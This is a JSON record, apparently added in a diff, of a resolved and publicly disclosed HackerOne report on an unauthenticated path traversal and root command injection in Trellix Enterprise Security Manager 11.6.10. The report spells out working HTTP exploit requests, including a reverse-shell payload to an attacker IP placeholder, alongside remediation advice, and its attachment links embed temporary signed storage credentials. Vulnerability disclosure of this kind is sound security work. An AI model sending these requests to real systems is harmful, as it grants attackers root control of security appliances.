@@ -1,0 +1,177 @@
+{
+  "id": 2817658,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODE3NjU4",
+  "url": "https://hackerone.com/reports/2817658",
+  "title": "Unauthenticated Path Traversal and Command Injection in Trellix Enterprise Security Manager 11.6.10",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2024-11-02T14:25:31.191Z",
+  "submitted_at": "2024-11-02T14:40:47.714Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "r4v",
+    "url": "/r4v",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1930,
+    "url": "https://hackerone.com/trellix",
+    "handle": "trellix",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ybrd6y6qwgyfnk739ppvqwa685xu/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/ybrd6y6qwgyfnk739ppvqwa685xu/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Trellix",
+      "twitter_handle": "",
+      "website": "https://www.trellix.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2025-01-12T07:22:07.649Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-12-13T07:21:58.163Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Product:** Trellix Enterprise Security Manager (ESM)\n\n**Version Tested:** 11.6.10\n\n**Source:** Publicly available trial version from [Trellix Trials](https://www.trellix.com/downloads/trials/?selectedTab=siem) — \"Trellix Enterprise Security Manager, Event Receiver & Log Manager VM for SIEM v11.6.10.\"\n\n**Potentially Affected Versions:** Latest version could also be vulnerable\n\n**Vulnerability Type:** Path Traversal, Command Injection\n\n**Severity:** Critical\n\n---\n\n## Summary:\nA critical vulnerability in Trellix Enterprise Security Manager (ESM) version 11.6.10 allows **unauthenticated** access to the internal `Snowservice` API and enables remote code execution through command injection, executed as the root user. This vulnerability results from multiple flaws in the application's design and configuration, including improper handling of path traversal, insecure forwarding to an AJP backend without adequate validation, and lack of authentication for accessing internal API endpoints.\n\nThe root cause lies in the way the ESM forwards requests to the AJP service using `ProxyPass`, specifically configured as:\n\n```apache\nProxyPass         /rs  ajp://localhost:8009/rs\n```\n\nThis configuration permits unintended external access to internal paths by leveraging the `..;/` traversal sequence, which bypasses typical directory restrictions. This technique is further explained in **Breaking Parser Logic: Take Your Path Normalization Off and Pop 0days Out** by Orange Tsai at Black Hat USA 2018 ([source](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)). The `..;/` sequence bypasses common path validation checks, making it possible to access restricted internal APIs. Combined with command injection vulnerabilities, this leads to a critical security risk.\n\n---\n\n## Product reports - releases affected:\nWherever possible, please test against the latest released version.\n  * Tested on Trellix Enterprise Security Manager version 11.6.10 (Linux)\n  * Other versions may also be affected (please verify)\n\n---\n\n## Website reports - browsers verified in:\nPlease provide the full URL.\n  * Tested via HTTP requests (no specific browser required)\n\n---\n\n## Steps to reproduce:\n1. Access the `/rs/..;/Snowservice/SnowflexAdminServices/CreateNode` endpoint without authentication to confirm unauthenticated access.\n2. Submit a request to the `CreateNode` endpoint to verify unauthorized path traversal access to the internal API.\n3. Exploit command injection via the `ManageNode` endpoint to execute commands with root privileges.\n\n### Step 1: Unauthenticated API Access via Path Traversal\n\nThe following request demonstrates unauthenticated access to the internal API:\n\n#### Request Example:\n```http\nPOST /rs/..;/Snowservice/SnowflexAdminServices/CreateNode HTTP/1.0\nHost: [ESM IP]\nAccept: application/json\nContent-Type: application/json\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36\nContent-Length: 118\n\n{\n    \"serverName\": \"test132\", \n    \"ip\": \"127.0.0.1\",\n    \"port\": \"1212\",\n    \"peerPort\": \"1210\"\n}\n```\n\n### Step 2: Remote Code Execution via Command Injection with Root Privileges\n\nThe following command injection payload in the `name` parameter provides remote root access:\n\n#### Request Example:\n```http\nPOST /rs/..;/Snowservice/SnowflexAdminServices/ManageNode HTTP/1.0\nHost: [ESM IP]\nAccept: application/json\nContent-Type: application/json\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36\nContent-Length: 186\n\n{\n    \"serverName\": \"test132\",\n    \"processes\": [\n        {\n            \"name\": \"`bash -i >& /dev/tcp/[Attacker IP]/2137 0>&1`\", \n            \"signal\": \"Restart\"\n        }\n    ]\n}\n```\n\nThis payload opens a reverse shell to the attacker’s machine, providing root access and full control over the system.\n\n---\n\n## Supporting material/references:\n* **Screenshot 1**: screenshot.png - This screenshot shows the HTTP request used to exploit the command injection vulnerability and the reverse shell connection received by the attacker.\n* **Screenshot 2**: screenshot2.png - This screenshot displays the process list on the compromised system, showing the injected command being executed as root. It also shows the whole command executed.\n\n---\n\n## Impact\n\nExploiting this vulnerability allows an attacker to:\n- Gain **unauthenticated** access to internal API endpoints through path traversal.\n- Execute arbitrary commands as root, compromising the system entirely.\n\nThe impact of this vulnerability is rated **Critical** due to the combination of unauthenticated path traversal, insecure proxy forwarding, and command injection.\n\n---\n\n## Recommendations\n\n1. **Secure AJP Proxy Configuration**\n   - Review and restrict `ProxyPass` configurations. Ensure that internal paths are only accessible from trusted sources and prevent external access.\n   - Avoid using ambiguous path traversal characters like `..;/` by implementing additional path validation for all forwarded requests.\n\n2. **Path Validation and Access Control**\n   - Implement robust path validation to reject sequences like `..;/` that enable unauthorized access.\n   - Ensure access controls are in place for internal APIs, blocking all unauthorized users and enforcing authentication.\n\n3. **Command Injection Prevention**\n   - Enforce strict input sanitization, especially for sensitive parameters like `name`. Reject special characters and command syntax in user inputs.\n   - Implement whitelisting of acceptable commands and arguments to prevent arbitrary code execution.\n\n4. **Principle of Least Privilege**\n   - Avoid running the service as root to reduce potential damage if an exploit occurs.\n\n---\n\n## Impact Summary\n\nThis vulnerability in Trellix ESM 11.6.10 allows **unauthenticated** access to an internal API through path traversal enabled by insecure AJP forwarding and lacks input validation, permitting command injection with root execution. Confirmed on the publicly available trial version, this vulnerability likely affects other versions and requires urgent remediation.\n\n---\n\n## Note to Vendor\n\nIt is recommended that Trellix verify which versions of the software are affected by this vulnerability. This issue may not be limited to version 11.6.10 and could impact previous versions as well. A thorough review of historical versions is advised to assess the scope of this vulnerability and ensure proper patching across affected releases.\n\n**Thank you for reviewing this report. I am available for any further questions or additional information.**\n\n**Best Regards,**  \nRafal Gill (r4v)",
+  "weakness": {
+    "id": 59,
+    "name": "OS Command Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 3729311,
+      "file_name": "screenshot2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uhi1yefe6ewubkaau9u9ygxceo8m?response-content-disposition=attachment%3B%20filename%3D%22screenshot2.png%22%3B%20filename%2A%3DUTF-8%27%27screenshot2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5HBVTKPC%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150228Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIQD8WGfYtEd%2F9%2Fq1%2FF5LEjtOMz%2B3Hk7B7PSA26pAw0wOswIgSLB0Ak9Xzn8kamhYvLrAVYYf%2FrsLhma2hpYiOuNE3F4quwUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDHTJz%2F4Rkmea5gbvSyqPBVlvmMh6da0rR0pEiw5w48eamBqCSL%2BzjsbZB%2Fi6tdMqbhmYmcqpJEF6MS%2FQPDMjSCs3l3nKJ9BYv1Vb%2B2w7lCx4AnmukaDD2GgIsQyoO9RlI8OE11JFAWErpLEqSrREFhkiOnlOpkX3SFRwLuQnpMFBUtfJ7yWP0U1qu9a4O5clZ8vCseIZIEkAWSr%2FQvnXY%2FfMsOf78iDsKnWazk%2BoNhAzFXmx%2BwxedzA7SkVG5D5xwr81CF9hlb%2Flg2EXFksZY81oTLts7t%2BbjX800M7aHz%2BtjXfthJ9pQs8hj9%2BQZfsxphdQ1XmkliU3eXwp3eO6L3b9xxv602sI8v4itSiYwwSZnobyU3sQ7cbEyiivnEUxkCGppJuPwWKKHTmloFU2XS18PlwwYZwEKODQ8%2BiurSGAwcUawSJR7aEvxRo%2B82yMa2qilMIgsU3iorw2Ivk1Dr76zH3JWx8NkORZzRZ81Pp39LHL2IIWHXo8ms1rCwvMjYXm6EDKeuTG%2B1nFW1l7cUIXNXSYxeLAyA7FJdMWhqVs1bQxHghx4JAFK5TlIlczgM05wEXZC42AtN4eDM3V9Is1w%2FsN1zTT%2BWGC1JuKbC2d7o2iGtrsIQA9xpGe97XJQKMSsZeqLQA%2BbkM0VwGKwzeqwD7OAOxStJ5BvgI%2F7aE2MsxK1O%2FT5kvdB%2F4lbFbvZ3dpjY4Ag4kpEEsHQabJyMR6W9OOxDBWcuBAY0%2Belv%2FWieQWlMWl1Nk6jC%2BJ7gfsT%2BmyKaDFF1oAqF3ymGtSiv7UwAp8AbqU8zE4QoyuxpaClHGlNxU8H63W8gIO1V7tkEk%2BoZ98Wr%2FojH2ZTBgmm6gkpCCk%2FKtxhrKq1xEfIBE3XvsFdHmHJfB3NTdSv58wvvj8zwY6sQGW7eLAvADLPqvI9%2BpfYkAuoC5na4%2FPfYBseB%2BMuPQSL2j4kTBcDYng6TRCbifuAN1yKY1qCeyUt2yeayi9ACBZDuFJcJMEn%2FRLT7x6PMvZoiX3olaC17XZgfRUQTQYBv1mUV1HNSjgeRi7m5dYpLTxjPGau9lEZUp0KwsHhXY%2BOv4DiWXvsnatZXP4DEIijMItprbrYRLuOhOGkUGAUypSNWuSW78PaQRu9vyBQ72f2HY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=51a55bd455c677e487ae0981d3dfa2073ae41fc53967b01a1204a346d5437c91",
+      "file_size": 20619,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 3729312,
+      "file_name": "screenshot.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/287hrqo1zvnkhb799t8uzbo1nhis?response-content-disposition=attachment%3B%20filename%3D%22screenshot.png%22%3B%20filename%2A%3DUTF-8%27%27screenshot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5HBVTKPC%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150228Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIQD8WGfYtEd%2F9%2Fq1%2FF5LEjtOMz%2B3Hk7B7PSA26pAw0wOswIgSLB0Ak9Xzn8kamhYvLrAVYYf%2FrsLhma2hpYiOuNE3F4quwUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDHTJz%2F4Rkmea5gbvSyqPBVlvmMh6da0rR0pEiw5w48eamBqCSL%2BzjsbZB%2Fi6tdMqbhmYmcqpJEF6MS%2FQPDMjSCs3l3nKJ9BYv1Vb%2B2w7lCx4AnmukaDD2GgIsQyoO9RlI8OE11JFAWErpLEqSrREFhkiOnlOpkX3SFRwLuQnpMFBUtfJ7yWP0U1qu9a4O5clZ8vCseIZIEkAWSr%2FQvnXY%2FfMsOf78iDsKnWazk%2BoNhAzFXmx%2BwxedzA7SkVG5D5xwr81CF9hlb%2Flg2EXFksZY81oTLts7t%2BbjX800M7aHz%2BtjXfthJ9pQs8hj9%2BQZfsxphdQ1XmkliU3eXwp3eO6L3b9xxv602sI8v4itSiYwwSZnobyU3sQ7cbEyiivnEUxkCGppJuPwWKKHTmloFU2XS18PlwwYZwEKODQ8%2BiurSGAwcUawSJR7aEvxRo%2B82yMa2qilMIgsU3iorw2Ivk1Dr76zH3JWx8NkORZzRZ81Pp39LHL2IIWHXo8ms1rCwvMjYXm6EDKeuTG%2B1nFW1l7cUIXNXSYxeLAyA7FJdMWhqVs1bQxHghx4JAFK5TlIlczgM05wEXZC42AtN4eDM3V9Is1w%2FsN1zTT%2BWGC1JuKbC2d7o2iGtrsIQA9xpGe97XJQKMSsZeqLQA%2BbkM0VwGKwzeqwD7OAOxStJ5BvgI%2F7aE2MsxK1O%2FT5kvdB%2F4lbFbvZ3dpjY4Ag4kpEEsHQabJyMR6W9OOxDBWcuBAY0%2Belv%2FWieQWlMWl1Nk6jC%2BJ7gfsT%2BmyKaDFF1oAqF3ymGtSiv7UwAp8AbqU8zE4QoyuxpaClHGlNxU8H63W8gIO1V7tkEk%2BoZ98Wr%2FojH2ZTBgmm6gkpCCk%2FKtxhrKq1xEfIBE3XvsFdHmHJfB3NTdSv58wvvj8zwY6sQGW7eLAvADLPqvI9%2BpfYkAuoC5na4%2FPfYBseB%2BMuPQSL2j4kTBcDYng6TRCbifuAN1yKY1qCeyUt2yeayi9ACBZDuFJcJMEn%2FRLT7x6PMvZoiX3olaC17XZgfRUQTQYBv1mUV1HNSjgeRi7m5dYpLTxjPGau9lEZUp0KwsHhXY%2BOv4DiWXvsnatZXP4DEIijMItprbrYRLuOhOGkUGAUypSNWuSW78PaQRu9vyBQ72f2HY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3c45e7566498c1dfbf92199db7aeb33100d89c84afd54e15c2a1baa60fa4fb69",
+      "file_size": 204592,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2025-01-12T07:21:58.353Z",
+  "allow_singular_disclosure_after": -41672430.54043964,
+  "singular_disclosure_allowed": true,
+  "vote_count": 60,
+  "voters": [
+    "ryuku",
+    "k0ns0l",
+    "m4khn0",
+    "nakyamad",
+    "haxor31337",
+    "roland_hack",
+    "0xmystr0",
+    "yassinek3ch",
+    "dukrov",
+    "mohaned0101",
+    "and 50 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 10.0,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 28151,
+    "asset_type": "OTHER",
+    "asset_identifier": "Trellix Products",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 569449,
+      "category": "researcher",
+      "content": "A critical unauthenticated path traversal and command injection vulnerability was identified in Trellix Enterprise Security Manager (ESM) 11.6.10. The ESM's AJP configuration (`ProxyPass /rs ajp://localhost:8009/rs`) allows unauthorized access to internal API endpoints by exploiting a `..;/` path traversal sequence, bypassing directory restrictions. The `/Snowservice/SnowflexAdminServices/ManageNode` endpoint is further vulnerable to command injection in the `name` parameter, allowing remote code execution as root. This vulnerability permits full system compromise via a reverse shell. \n\n*Tested on version 11.6.10. Other versions may be affected.*",
+      "updated_at": "2024-11-02T14:43:16.759Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 18864,
+        "username": "r4v",
+        "name": "Rafał Gill",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "https://r4v.pl/about-me",
+        "location": "Poland",
+        "created_at": "2015-03-13T18:02:26.353Z",
+        "url": "https://hackerone.com/r4v",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+        }
+      }
+    }
+  ]
+}
